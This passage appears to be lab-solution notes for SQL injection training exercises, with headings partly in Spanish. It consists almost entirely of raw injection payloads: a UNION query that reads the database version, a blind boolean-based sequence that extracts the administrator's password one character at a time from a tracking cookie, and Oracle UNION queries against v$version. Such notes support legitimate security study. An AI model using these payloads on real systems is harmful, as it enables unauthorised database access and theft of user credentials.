
#### 13. SQL injection UNION attack, retrieving multiple values in a single column
```
category=Pets'union select NULL,version()-- -
```

#### Blind SQL injection with conditional responses
```
TrackingId=xyz' AND '1'='1  
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a  
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a  
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a  
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§ 
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
TrackingId=xyz' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='a
``` 

#### Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en Oracle 
```
'+UNION+SELECT+'abc','def'+FROM+dual--
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```
